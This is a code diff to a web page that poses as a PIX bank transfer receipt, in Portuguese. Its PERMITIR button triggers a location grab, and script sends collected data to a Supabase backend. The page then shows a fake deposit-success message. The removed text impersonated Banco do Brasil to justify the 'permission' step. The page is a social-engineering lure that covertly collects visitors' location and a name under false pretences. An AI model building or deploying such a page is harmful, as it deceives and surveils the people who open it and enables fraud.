@@ -11,11 +11,11 @@
 <body>
     <h2>Comprovante de transação PIX</h2>
     
-    <p id="status">Banco do Brasil informa: Por questões de segurança, depósitos ou transferências acima de mil reais necessitam permissão especial para efetivação. Para confirmar, digite o nome completo da pessoa beneficiária e depois clique em PERMITIR DEPÓSITO para prosseguir com seu depósito.</p>
+    <p id="status">Para confirmar, digite o nome completo da pessoa beneficiária e depois clique em PERMITIR para prosseguir com seu depósito.</p>
     
     <button onclick="getLocation()">PERMITIR</button>
 
-    <img id="imagem" src="assets\android-chrome-192x192.png" alt="Imagem dinâmica" width="300">
+    <img id="imagem" src="assets\android-chrome-192x192.png" alt="Comprovante" width="300">
     <script>
         
         // Certifique-se de carregar o SDK do Supabase antes
@@ -88,7 +88,7 @@
                     throw error;
                 }
     
-                document.getElementById("status").innerText = "Depósito realizado com sucesso. Caso não consiga visualizar seu comprovante corretamente, solicite a segunda via ao banco pelos canais oficiais de atendimento.";
+                document.getElementById("status").innerText = "Depósito realizado com sucesso.";
                 console.log("Sucesso:", data);
             } catch (err) {
                 console.error("Erro ao enviar:", err.message);
